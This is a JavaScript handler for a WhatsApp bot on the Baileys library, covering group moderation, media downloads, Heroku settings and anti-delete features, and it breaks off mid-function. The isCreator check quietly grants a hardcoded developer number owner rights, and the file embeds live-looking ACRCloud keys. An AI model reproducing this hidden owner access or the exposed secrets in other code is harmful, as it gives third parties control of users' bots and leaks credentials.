
require('./settings')
const {
  generateWAMessageFromContent,
  proto,
  downloadContentFromMessage,
} = require("@whiskeysockets/baileys");
const { exec, spawn, execSync } = require("child_process")
const util = require('util')
const fetch = require('node-fetch')
const path = require('path')
const fs = require('fs');
const axios = require('axios')
const acrcloud = require ('acrcloud');
const FormData = require('form-data');
const cheerio = require('cheerio')
const { performance } = require("perf_hooks");
const process = require('process');
const moment = require("moment-timezone")
const lolcatjs = require('lolcatjs')
const os = require('os');
const speed = require('performance-now')
const yts = require("yt-search")
const jsobfus = require("javascript-obfuscator");
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const timestampp = speed();
const latensi = speed() - timestampp
const devMalvin = '263780166288';
const mainOwner = "263780166288@s.whatsapp.net";
const {
    smsg,
    formatDate,
    getTime,
    getGroupAdmins,
    formatp,
    await,
    sleep,
    isUrl,
    runtime,   
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    fetchJson,
    getBuffer,
    json,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    fetchBuffer,
    buffergif,
    GIFBufferToVideoBuffer,
    totalcase,
    bytesToSize,
    checkBandwidth,
} = require('./lib/myfunc')

//delay
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

//error handling
const errorLog = new Map();
const ERROR_EXPIRY_TIME = 60000; // 60 seconds

const recordError = (error) => {
  const now = Date.now();
  errorLog.set(error, now);
  setTimeout(() => errorLog.delete(error), ERROR_EXPIRY_TIME);
};

const shouldLogError = (error) => {
  const now = Date.now();
  if (errorLog.has(error)) {
    const lastLoggedTime = errorLog.get(error);
    if (now - lastLoggedTime < ERROR_EXPIRY_TIME) {
      return false;
    }
  }
  return true;
};
// Lightweight emoji react function specific for inline commands
const react = async (Jinwoo, m, emoji) => {
  try {
    await Jinwoo.sendMessage(m.chat, {
      react: {
        text: emoji,
        key: m.key
      }
    });
  } catch (e) {
    console.error("❌ Failed to react:", e);
  }
};

//Images
const techking1 = fs.readFileSync("./media/Images/jinwoo1.jpg");
const techking2 = fs.readFileSync("./media/Images/jinwoo2.jpg");
const techking3 = fs.readFileSync("./media/Images/jinwoo3.jpg");
const techking4 = fs.readFileSync("./media/Images/jinwoo4.jpg");
const techking5 = fs.readFileSync("./media/Images/jinwoo5.jpg");
const kingmalvin = fs.readFileSync("./media/audios/menu.m4a");

//Version
const versions = require("./package.json").version;
const dlkey = '_0x5aff35,_0x1876stqr';

//badwords
const bad = JSON.parse(fs.readFileSync("./src/badwords.json")); 

//Shazam
const acr = new acrcloud({
    host: 'identify-eu-west-1.acrcloud.com',
    access_key: '882a7ef12dc0dc408f70a2f3f4724340',
    access_secret: 'qVvKAxknV7bUdtxjXS22b5ssvWYxpnVndhy2isXP'
});

//database 
global.db.data = JSON.parse(fs.readFileSync("./src/database.json"));

if (global.db.data) {
  global.db.data = {
    chats: {},
    settings: {},
    blacklist: { blacklisted_numbers: [] }, 
    ...(global.db.data || {}),
  };
}

module.exports = Jinwoo = async (Jinwoo, m, chatUpdate, store) => {
try {
const { type, quotedMsg, mentioned, now, fromMe } = m;

var body =
  m.message?.protocolMessage?.editedMessage?.conversation || 
  m.message?.protocolMessage?.editedMessage?.extendedTextMessage?.text ||
  m.message?.protocolMessage?.editedMessage?.imageMessage?.caption ||
  m.message?.protocolMessage?.editedMessage?.videoMessage?.caption || 
  m.message?.conversation ||
  m.message?.imageMessage?.caption ||
  m.message?.videoMessage?.caption ||
  m.message?.extendedTextMessage?.text ||
  m.message?.buttonsResponseMessage?.selectedButtonId ||
  m.message?.listResponseMessage?.singleSelectReply?.selectedRowId ||
  m.message?.templateButtonReplyMessage?.selectedId ||
  m.message?.pollCreationMessageV3?.name || 
  m.message?.documentMessage?.caption ||
  m.text || ""; 

var budy = 
  typeof body === "string" && body.length > 0 
    ? body 
    : typeof m.text === "string" 
      ? m.text 
      : "";

//prefix   
const prefix = global.prefixz; 

const isCmd = body.startsWith(prefix);
const trimmedBody = isCmd ? body.slice(prefix.length).trimStart() : "";

//command
const command = isCmd && trimmedBody ? trimmedBody.split(/\s+/).shift().toLowerCase() : "";

const args = trimmedBody.split(/\s+/).slice(1);
const text = q = args.join(" ");
const full_args = body.replace(command, '').slice(1).trim();
const pushname = m.pushName || "No Name";
const botNumber = await Jinwoo.decodeJid(Jinwoo.user.id);
const sender = m.sender
const senderNumber = sender.split('@')[0]
const isCreator = [botNumber, devMalvin, global.ownernumber, ...global.sudo]
      .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
      .includes(m.sender);
const itsMe = m.sender == botNumber ? true : false;
const from = m.key.remoteJid;
const quotedMessage = m.quoted || m;
const quoted =
  quotedMessage?.mtype === "buttonsMessage"
    ? quotedMessage[Object.keys(quotedMessage)[1]]
    : quotedMessage?.mtype === "templateMessage" && quotedMessage.hydratedTemplate
    ? quotedMessage.hydratedTemplate[Object.keys(quotedMessage.hydratedTemplate)[1]]
    : quotedMessage?.mtype === "product"
    ? quotedMessage[Object.keys(quotedMessage)[0]]
    : m.quoted || m;
const mime = quoted?.msg?.mimetype || quoted?.mimetype || "";

// Group Metadata
const groupMetadata = m.isGroup
  ? await Jinwoo.groupMetadata(m.chat).catch((e) => {
      console.error('Error fetching group metadata:', e);
      return null; // Return null if an error occurs
    })
  : null;

// Ensure groupMetadata is not null before accessing its properties
const groupName = m.isGroup && groupMetadata ? groupMetadata.subject : "";
const participants = m.isGroup && groupMetadata ? groupMetadata.participants : [];
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : [];
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
const isBot = botNumber.includes(senderNumber);
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
const groupOwner = m.isGroup && groupMetadata ? groupMetadata.owner : "";
const isGroupOwner = m.isGroup
  ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender)
  : false;

//================== [ FUNCTION ] ==================//
async function setHerokuEnvVar(varName, varValue) {
  const apiKey = process.env.HEROKU_API_KEY;
  const appName = process.env.HEROKU_APP_NAME;
  
  try {
    const response = await axios.patch(`https://api.heroku.com/apps/${appName}/config-vars`, {
      [varName]: varValue
    }, {
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/vnd.heroku+json; version=3',
        'Authorization': `Bearer ${apiKey}`
      }
    });
    return response.data;
  } catch (error) {
    console.error('Error setting env var:', error);
    throw new Error(`Failed to set environment variable, please make sure you've entered heroku api key and app name correctly.`);
  }
}

async function getHerokuEnvVars() {
  const apiKey = process.env.HEROKU_API_KEY;
  const appName = process.env.HEROKU_APP_NAME;

  try {
    const response = await axios.get(`https://api.heroku.com/apps/${appName}/config-vars`, {
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/vnd.heroku+json; version=3',
        'Authorization': `Bearer ${apiKey}`
      }
    });
    return response.data;
  } catch (error) {
    console.error('Error getting env vars:', error);
    throw new Error('Failed to get environment variables');
  }
}

async function deleteHerokuEnvVar(varName) {
  const apiKey = process.env.HEROKU_API_KEY;
  const appName = process.env.HEROKU_APP_NAME;

  try {
    const response = await axios.patch(`https://api.heroku.com/apps/${appName}/config-vars`, {
      [varName]: null
    }, {
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/vnd.heroku+json; version=3',
        'Authorization': `Bearer ${apiKey}`
      }
    });
    return response.data;
  } catch (error) {
    console.error('Error deleting env var:', error);
    throw new Error(`Failed to set environment variable, please make sure you've entered heroku api key and app name correctly`); 
  }
}


// Function to fetch MP3 download URL
async function fetchMp3DownloadUrl(link) {
  const fetchDownloadUrl1 = async (videoUrl) => {
    const apiUrl = `https://api.giftedtech.my.id/api/download/dlmp3?apikey=${dlkey}&url=${videoUrl}`;
    try {
      const response = await axios.get(apiUrl);
      if (response.status !== 200 || !response.data.success) {
        throw new Error('Failed to fetch from GiftedTech API');
      }
      return response.data.result.download_url;
    } catch (error) {
      console.error('Error with GiftedTech API:', error.message);
      throw error;
    }
  };

  const fetchDownloadUrl2 = async (videoUrl) => {
    const format = 'mp3';
    const url = `https://p.oceansaver.in/ajax/download.php?format=${format}&url=${encodeURIComponent(videoUrl)}&api=dfcb6d76f2f6a9894gjkege8a4ab232222`;
    try {
      const response = await axios.get(url, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
      });
      if (!response.data || !response.data.success) throw new Error('Failed to fetch from API2');

      const { id } = response.data;
      while (true) {
        const progress = await axios.get(`https://p.oceansaver.in/ajax/progress.php?id=${id}`, {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
          }
        });
        if (progress.data && progress.data.success && progress.data.progress === 1000) {
          return progress.data.download_url;
        }
        await new Promise(resolve => setTimeout(resolve, 5000));
      }
    } catch (error) {
      console.error('Error with API2:', error.message);
      throw error;
    }
  };

  try {
    let downloadUrl;
    try {
      downloadUrl = await fetchDownloadUrl1(link);
    } catch (error) {
      console.log('Falling back to second API...');
      downloadUrl = await fetchDownloadUrl2(link);
    }
    return downloadUrl;
  } catch (error) {
    throw error;
  }
}

async function fetchVideoDownloadUrl(link) {
  const apiUrl = `https://api.giftedtech.my.id/api/download/dlmp4?apikey=${dlkey}&url=${encodeURIComponent(link)}`;
  
  try {
    const response = await axios.get(apiUrl);
    if (response.status !== 200 || !response.data.success) {
      throw new Error('Failed to retrieve the video!');
    }
    return response.data.result;
  } catch (error) {
    console.error('Error fetching video download URL:', error.message);
    throw error;
  }
}

async function saveStatusMessage(m) {
  try {
    if (!m.quoted || m.quoted.chat !== 'status@broadcast') {
      return m.reply('*Please reply to a status message!*');
    }
    await m.quoted.copyNForward(m.chat, true);
    Jinwoo.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    console.log('Status saved successfully!');
  } catch (error) {
    console.error('Failed to save status message:', error);
    m.reply(`Error: ${error.message}`);
  }
}

async function ephoto(url, texk) {
      let form = new FormData();
      let gT = await axios.get(url, {
        headers: {
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
        },
      });
      let $ = cheerio.load(gT.data);
      let text = texk;
      let token = $("input[name=token]").val();
      let build_server = $("input[name=build_server]").val();
      let build_server_id = $("input[name=build_server_id]").val();
      form.append("text[]", text);
      form.append("token", token);
      form.append("build_server", build_server);
      form.append("build_server_id", build_server_id);
      let res = await axios({
        url: url,
        method: "POST",
        data: form,
        headers: {
          Accept: "*/*",
          "Accept-Language": "en-US,en;q=0.9",
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
          cookie: gT.headers["set-cookie"]?.join("; "),
          "Content-Type": "multipart/form-data",
        },
      });
      let $$ = cheerio.load(res.data);
      let json = JSON.parse($$("input[name=form_value_input]").val());
      json["text[]"] = json.text;
      delete json.text;
      let { data } = await axios.post(
        "https://en.ephoto360.com/effect/create-image",
        new URLSearchParams(json),
        {
          headers: {
            "user-agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
            cookie: gT.headers["set-cookie"].join("; "),
          },
        }
      );
      return build_server + data.image;
 }

//obfuscator 
async function obfus(query) {
      return new Promise((resolve, reject) => {
        try {
          const obfuscationResult = jsobfus.obfuscate(query, {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1,
          });
          const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode(),
          };
          resolve(result);
        } catch (e) {
          reject(e);
        }
      });
    }

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
 
// TAKE  PP USER
try {
var ppuser = await Jinwoo.profilePictureUrl(m.sender, 'image')} catch (err) {
let ppuser = 'https://telegra.ph/file/6880771a42bad09dd6087.jpg'}
let ppnyauser = await getBuffer(ppuser)
let ppUrl = await Jinwoo.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')

//================== [ DATABASE ] ==================//
try {
  if (from.endsWith('@g.us')) { 
    let chats = global.db.data.chats[from];
    if (typeof chats !== "object") global.db.data.chats[from] = {};
    chats = global.db.data.chats[from]; 
    if (!("antibot" in chats)) chats.antibot = false;
    if (!("antilink" in chats)) chats.antilink = false;
    if (!("badword" in chats)) chats.badword = false; 
    if (!("antilinkgc" in chats)) chats.antilinkgc = false;
    if (!("antilinkkick" in chats)) chats.antilinkkick = false;
    if (!("badwordkick" in chats)) chats.badwordkick = false; 
    if (!("antilinkgckick" in chats)) chats.antilinkgckick = false;
  }

  let setting = global.db.data.settings[botNumber];
  if (typeof setting !== "object") global.db.data.settings[botNumber] = {};
  setting = global.db.data.settings[botNumber]; 
  if (!("autobio" in setting)) setting.autobio = false;
  if (!("autotype" in setting)) setting.autotype = false;
  if (!("autoread" in setting)) setting.autoread = false; 
  if (!("autorecord" in setting)) setting.autorecord = false; 
  if (!("autorecordtype" in setting)) setting.autorecordtype = false;

  let blacklist = global.db.data.blacklist;
  if (!blacklist || typeof blacklist !== "object") global.db.data.blacklist = { blacklisted_numbers: [] };

} catch (err) {
  console.error("Error initializing database:", err);
}

//================== [ CONSOLE LOG] ==================//
const dayz = moment(Date.now()).tz(`${timezones}`).locale('en').format('dddd');
const timez = moment(Date.now()).tz(`${timezones}`).locale('en').format('HH:mm:ss z');
const datez = moment(Date.now()).tz(`${timezones}`).format("DD/MM/YYYY");

if (m.message) {
  lolcatjs.fromString(`┏━━━━━━━━━━━━━『 Jinwoo-bot 』━━━━━━━━━━━━━─`);
  lolcatjs.fromString(`» Sent Time: ${dayz}, ${timez}`);
  lolcatjs.fromString(`» Message Type: ${m.mtype}`);
  lolcatjs.fromString(`» Sender Name: ${pushname || 'N/A'}`);
  lolcatjs.fromString(`» Chat ID: ${m.chat.split('@')[0]}`);
  lolcatjs.fromString(`» Message: ${budy || 'N/A'}`);
 lolcatjs.fromString('┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─ ⳹\n\n');
}
//<================================================>//
    //auto set bio\\
    if (db.data.settings[botNumber].autobio) {
    
         let xdpy = moment(Date.now()).tz(`${timezones}`).locale('en').format('dddd');
         let xtipe = moment(Date.now()).tz(`${timezones}`).locale('en').format('HH:mm z');
         let xdpte = moment(Date.now()).tz(`${timezones}`).format("DD/MM/YYYY");
        
     Jinwoo.updateProfileStatus(
        `${xtipe}, ${xdpy}; ${xdpte}:- ${botname}`
      ).catch((_) => _);
  }
//<================================================>//
    //auto type record
    if (db.data.settings[botNumber].autorecordtype) {
      if (m.message) {
        let XpBotmix = ["composing", "recording"];
        XpBotmix2 = XpBotmix[Math.floor(XpBotmix.length * Math.random())];
        Jinwoo.sendPresenceUpdate(XpBotmix2, from);
      }
    }
    if (db.data.settings[botNumber].autorecord) {
      if (m.message) {
        let XpBotmix = ["recording"];
        XpBotmix2 = XpBotmix[Math.floor(XpBotmix.length * Math.random())];
        Jinwoo.sendPresenceUpdate(XpBotmix2, from);
      }
    }
    if (db.data.settings[botNumber].autotype) {
      if (m.message) {
        let XpBotpos = ["composing"];
        Jinwoo.sendPresenceUpdate(XpBotpos, from);
      }
    }   
//<================================================>//
    if (from.endsWith('@g.us') && db.data.chats[m.chat].antibot) {
  if (m.isBaileys && (!isAdmins || !isCreator || isBotAdmins )) {
          m.reply(`*BOT DETECTED*\n\nGo away!`);
          await Jinwoo.groupParticipantsUpdate(
            m.chat,
            [m.sender],
            "remove"
          );
        }
    }
//<================================================>//
if (from.endsWith('@g.us') && db.data.chats[m.chat].antilinkgc) {
    const groupLinkRegex = /(?:https?:\/\/)?chat\.whatsapp\.com\/\S+/i; 

    if (m.message && groupLinkRegex.test(budy)) {
        if (isAdmins || isCreator || !isBotAdmins) return; 

        await Jinwoo.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant,
            },
        });
    }
}
//<================================================>//
if (from.endsWith('@g.us') && db.data.chats[m.chat].antilinkgckick) {
  const groupLinkRegex = /(?:https?:\/\/)?chat\.whatsapp\.com\/\S+/i; 
  
    if (m.message && groupLinkRegex.test(budy)) {
        if (isAdmins || isCreator || !isBotAdmins) return;
    {
        if (isAdmins || isCreator || !isBotAdmins) return;
        await Jinwoo.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant,
            },
        });
        Jinwoo.sendMessage(
            from,
            {
                text: `GROUP LINK DETECTED\n\n@${m.sender.split("@")[0]} *Beware, group links are not allowed in this group!*`,
                contextInfo: { mentionedJid: [m.sender] },
            },
            { quoted: m }
        );
      await Jinwoo.groupParticipantsUpdate(
            m.chat,
            [m.sender],
            "remove"
          );
    }
}
}
//<================================================>//
if (from.endsWith('@g.us') && db.data.chats[m.chat].antilink) {
    const linkRegex = /(?:https?:\/\/|www\.|t\.me\/|bit\.ly\/|tinyurl\.com\/|(?:[a-z0-9]+\.)+[a-z]{2,})(\/\S*)?/i;

    const messageContent = 
        m.message?.conversation ||
        m.message?.extendedTextMessage?.text ||
        m.message?.imageMessage?.caption ||
        m.message?.videoMessage?.caption ||
        m.message?.pollCreationMessageV3?.name ||
        m.message?.protocolMessage?.editedMessage?.conversation ||
        m.message?.protocolMessage?.editedMessage?.extendedTextMessage?.text ||
        m.message?.protocolMessage?.editedMessage?.imageMessage?.caption ||
        m.message?.protocolMessage?.editedMessage?.videoMessage?.caption ||
        m.message?.protocolMessage?.editedMessage || 
        pollMessageData; 

    if (messageContent && linkRegex.test(messageContent)) {
        if (isAdmins || isCreator || !isBotAdmins) return; 

        await Jinwoo.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant,
            },
        });
    }
}
//<================================================>//
if (from.endsWith('@g.us') && db.data.chats[m.chat].antilinkkick) {
    const linkRegex = /(?:https?:\/\/|www\.|t\.me\/|bit\.ly\/|tinyurl\.com\/|(?:[a-z0-9]+\.)+[a-z]{2,})(\/\S*)?/i;

    if (m.message && linkRegex.test(budy)) {
        if (isAdmins || isCreator || !isBotAdmins) return; 
      
        await Jinwoo.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant,
            },
        });
        await Jinwoo.sendMessage(
            from,
            {
                text: `LINK DETECTED\n\n@${m.sender.split("@")[0]} *Beware, links are not allowed in this group!*`,
                contextInfo: { mentionedJid: [m.sender] },
            },
            { quoted: m }
        );
     await Jinwoo.groupParticipantsUpdate(
            m.chat,
            [m.sender],
            "remove"
          );
    }
}
//<================================================>//
// Anti Bad Words
if (from.endsWith('@g.us') && db.data.chats[m.chat].badword) {
    for (let bak of bad) {
        let regex = new RegExp(`\\b${bak}\\b`, 'i'); 
        if (regex.test(budy)) {
            if (isAdmins || isCreator || !isBotAdmins) return; 
            
            await Jinwoo.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.key.participant,
                },
            });

            await Jinwoo.sendMessage(
                from,
                {
                    text: `BAD WORD DETECTED\n\n@${
                        m.sender.split("@")[0]
                    } *Beware, using bad words is prohibited in this group!*`,
                    contextInfo: { mentionedJid: [m.sender] },
                },
                { quoted: m }
            );
            break;
        }
    }
}
//<================================================>//
if (from.endsWith('@g.us') && db.data.chats[m.chat].badwordkick) {
    for (let bak of bad) {
        let regex = new RegExp(`\\b${bak}\\b`, 'i'); 
        if (regex.test(budy)) {
            if (isAdmins || isCreator || !isBotAdmins) return; 
            
            await Jinwoo.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.key.participant,
                },
            });

            await Jinwoo.sendMessage(
                from,
                {
                    text: `BAD WORD DETECTED\n\n@${
                        m.sender.split("@")[0]
                    } *You have been removed for using prohibited language!*`,
                    contextInfo: { mentionedJid: [m.sender] },
                },
                { quoted: m }
            );

            await Jinwoo.groupParticipantsUpdate(
                m.chat,
                [m.sender],
                "remove"
            );
            break; 
        }
    }
}
//<================================================>//
const storeFile = "./src/store.json";

function loadStoredMessages() {
    if (fs.existsSync(storeFile)) {
        return JSON.parse(fs.readFileSync(storeFile));
    }
    return {};
}

//*---------------------------------------------------------------*//
if (
    global.antidelete === 'private' &&
    m.message?.protocolMessage?.type === 0 && 
    m.message?.protocolMessage?.key
) {
    try {
        let messageId = m.message.protocolMessage.key.id;
        let chatId = m.chat;
        let deletedBy = m.sender;

        let storedMessages = loadStoredMessages();
        let deletedMsg = storedMessages[chatId]?.[messageId];

        if (!deletedMsg) {
            console.log("⚠️ Deleted message not found in database.");
            return;
        }

        let sender = deletedMsg.key.participant || deletedMsg.key.remoteJid;

let chatName;
if (deletedMsg.key.remoteJid === 'status@broadcast') {
    chatName = "Status Update";
} else if (m.isGroup) {
    try {
        const groupInfo = await Jinwoo.groupMetadata(m.chat);
        chatName = groupInfo.subject || "Group Chat";
    } catch {
        chatName = "Group Chat";
    }
} else {
    chatName = deletedMsg.pushName || m.pushName || "Private Chat";
}

        let xtipes = moment(deletedMsg.messageTimestamp * 1000).tz(`${timezones}`).locale('en').format('HH:mm z');
        let xdptes = moment(deletedMsg.messageTimestamp * 1000).tz(`${timezones}`).format("DD/MM/YYYY");

        if (!deletedMsg.message.conversation && !deletedMsg.message.extendedTextMessage) {
            try {
                let forwardedMsg = await Jinwoo.sendMessage(
                    Jinwoo.user.id,
                    { 
                        forward: deletedMsg,
                        contextInfo: { isForwarded: false }
                    },
                    { quoted: deletedMsg }
                );
                
                let mediaInfo = `🚨 *𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝙳𝙸𝙰!* 🚨
${readmore}
𝙲𝙷𝙰𝚃: ${chatName}
𝚂𝙴𝙽𝚃 𝙱𝚈: @${sender.split('@')[0]} 
𝚃𝙸𝙼𝙴: ${xtipes}
𝙳𝙰𝚃𝙴: ${xdptes}
𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @${deletedBy.split('@')[0]}`;

                await Jinwoo.sendMessage(
                    Jinwoo.user.id, 
                    { text: mediaInfo, mentions: [sender, deletedBy] },
                    { quoted: forwardedMsg }
                );
                
            } catch (mediaErr) {
                console.error("Media recovery failed:", mediaErr);
                let replyText = `🚨 *𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴!* 🚨
${readmore}
𝙲𝙷𝙰𝚃: ${chatName}
𝚂𝙴𝙽𝚃 𝙱𝚈: @${sender.split('@')[0]} 
𝚃𝙸𝙼𝙴 𝚂𝙴𝙽𝚃: ${xtipes}
𝙳𝙰𝚃𝙴 𝚂𝙴𝙽𝚃: ${xdptes}
𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @${deletedBy.split('@')[0]}

𝙼𝙴𝚂𝚂𝙰𝙶𝙴: [Unsupported media content]`;

                let quotedMessage = {
                    key: {
                        remoteJid: chatId,
                        fromMe: sender === Jinwoo.user.id,
                        id: messageId,
                        participant: sender
                    },
                    message: { conversation: "Media recovery failed" }
                };

                await Jinwoo.sendMessage(
                    Jinwoo.user.id,
                    { text: replyText, mentions: [sender, deletedBy] },
                    { quoted: quotedMessage }
                );
            }
        } 
        else {
            let text = deletedMsg.message.conversation || 
                      deletedMsg.message.extendedTextMessage?.text;

            let replyText = `🚨 *𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴!* 🚨
${readmore}
𝙲𝙷𝙰𝚃: ${chatName}
𝚂𝙴𝙽𝚃 𝙱𝚈: @${sender.split('@')[0]} 
𝚃𝙸𝙼𝙴 𝚂𝙴𝙽𝚃: ${xtipes}
𝙳𝙰𝚃𝙴 𝚂𝙴𝙽𝚃: ${xdptes}
𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @${deletedBy.split('@')[0]}

𝙼𝙴𝚂𝚂𝙰𝙶𝙴: ${text}`;

            let quotedMessage = {
                key: {
                    remoteJid: chatId,
                    fromMe: sender === Jinwoo.user.id,
                    id: messageId,
                    participant: sender
                },
                message: {
                    conversation: text 
                }
            };

            await Jinwoo.sendMessage(
                Jinwoo.user.id,
                { text: replyText, mentions: [sender, deletedBy] },
                { quoted: quotedMessage }
            );
        }

    } catch (err) {
        console.error("❌ Error processing deleted message:", err);
    }
} else if (
    m.sender !== botNumber &&
    global.antidelete === 'chat' &&
    m.message?.protocolMessage?.type === 0 && 
    m.message?.protocolMessage?.key
) {
    try {
        let messageId = m.message.protocolMessage.key.id;
        let chatId = m.chat;
        let deletedBy = m.sender;

        let storedMessages = loadStoredMessages();
        let deletedMsg = storedMessages[chatId]?.[messageId];

        if (!deletedMsg) {
            console.log("⚠️ Deleted message not found in database.");
            return;
        }

        let sender = deletedMsg.key.participant || deletedMsg.key.remoteJid;

     let chatName;
if (deletedMsg.key.remoteJid === 'status@broadcast') {
    chatName = "Status Update";
} else if (m.isGroup) {
    try {
        const groupInfo = await Jinwoo.groupMetadata(m.chat);
        chatName = groupInfo.subject || "Group Chat";
    } catch {
        chatName = "Group Chat";
    }
} else {
    chatName = deletedMsg.pushName || m.pushName || "Private Chat";
}

        let xtipes = moment(deletedMsg.messageTimestamp * 1000).tz(`${timezones}`).locale('en').format('HH:mm z');
        let xdptes = moment(deletedMsg.messageTimestamp * 1000).tz(`${timezones}`).format("DD/MM/YYYY");

        if (!deletedMsg.message.conversation && !deletedMsg.message.extendedTextMessage) {
            try {
                let forwardedMsg = await Jinwoo.sendMessage(
                    m.chat,
                    { 
                        forward: deletedMsg,
                        contextInfo: { isForwarded: false }
                    },
                    { quoted: deletedMsg }
                );
                
                let mediaInfo = `🚨 *𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝙳𝙸𝙰!* 🚨
${readmore}
𝙲𝙷𝙰𝚃: ${chatName}
𝚂𝙴𝙽𝚃 𝙱𝚈: @${sender.split('@')[0]} 
𝚃𝙸𝙼𝙴: ${xtipes}
𝙳𝙰𝚃𝙴: ${xdptes}
𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @${deletedBy.split('@')[0]}`;

                await Jinwoo.sendMessage(
                    m.chat, 
                    { text: mediaInfo, mentions: [sender, deletedBy] },
                    { quoted: forwardedMsg }
                );
                
            } catch (mediaErr) {
                console.error("Media recovery failed:", mediaErr);
                let replyText = `🚨 *𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴!* 🚨
${readmore}
𝙲𝙷𝙰𝚃: ${chatName}
𝚂𝙴𝙽𝚃 𝙱𝚈: @${sender.split('@')[0]} 
𝚃𝙸𝙼𝙴 𝚂𝙴𝙽𝚃: ${xtipes}
𝙳𝙰𝚃𝙴 𝚂𝙴𝙽𝚃: ${xdptes}
𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @${deletedBy.split('@')[0]}

𝙼𝙴𝚂𝚂𝙰𝙶𝙴: [Unsupported media content]`;

                let quotedMessage = {
                    key: {
                        remoteJid: chatId,
                        fromMe: sender === Jinwoo.user.id,
                        id: messageId,
                        participant: sender
                    },
                    message: { conversation: "Media recovery failed" }
                };

                await Jinwoo.sendMessage(
                    m.chat,
                    { text: replyText, mentions: [sender, deletedBy] },
                    { quoted: quotedMessage }
                );
            }
        } 
        else {
            let text = deletedMsg.message.conversation || 
                      deletedMsg.message.extendedTextMessage?.text;

            let replyText = `🚨 *𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴!* 🚨
${readmore}
𝙲𝙷𝙰𝚃: ${chatName}
𝚂𝙴𝙽𝚃 𝙱𝚈: @${sender.split('@')[0]} 
𝚃𝙸𝙼𝙴 𝚂𝙴𝙽𝚃: ${xtipes}
𝙳𝙰𝚃𝙴 𝚂𝙴𝙽𝚃: ${xdptes}
𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @${deletedBy.split('@')[0]}

𝙼𝙴𝚂𝚂𝙰𝙶𝙴: ${text}`;

            let quotedMessage = {
                key: {
                    remoteJid: chatId,
                    fromMe: sender === Jinwoo.user.id,
                    id: messageId,
                    participant: sender
                },
                message: {
                    conversation: text 
                }
            };

            await Jinwoo.sendMessage(
                m.chat,
                { text: replyText, mentions: [sender, deletedBy] },
                { quoted: quotedMessage }
            );
        }

    } catch (err) {
        console.error("❌ Error processing deleted message:", err);
    }
}
//<================================================>//
if (
    global.antiedit === 'private' &&
    (m.message?.protocolMessage?.editedMessage?.conversation || 
    m.message?.protocolMessage?.editedMessage?.extendedTextMessage?.text)
) {
    try {
        let messageId = m.message.protocolMessage.key.id;
        let chatId = m.chat;
        let editedBy = m.sender;

        let storedMessages = loadStoredMessages();
        let originalMsg = storedMessages[chatId]?.[messageId];

        if (!originalMsg) {
            console.log("⚠️ Original message not found in store.json.");
            return;
        }

        let sender = originalMsg.sender;
        let chatName = chatId.endsWith("@g.us") ? "(Group Chat)" : "(Private Chat)";

